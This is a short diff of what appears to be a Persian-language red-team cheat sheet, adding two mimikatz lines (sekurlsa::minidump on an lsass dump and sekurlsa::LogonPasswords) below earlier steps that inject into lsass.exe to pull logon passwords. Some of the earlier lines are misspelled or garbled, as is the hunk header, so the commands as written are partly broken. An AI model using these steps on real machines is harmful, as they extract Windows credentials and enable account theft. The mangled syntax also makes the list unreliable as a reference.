@@ -707,6 +707,8 @@ if I ip.src == 'ip' ) (
 3. mimikatz# privilege: :debug
 4. mimikatz# injeet::proeess lsass.exe sekurlsa.dll
 5. mimikatz# @getLogonPasswords
+6. sekurlsa::minidump /users/redteam/Desktop/lsass.DMP
+7. sekurlsa::LogonPasswords
 ```
 
 ### دستور Hping3
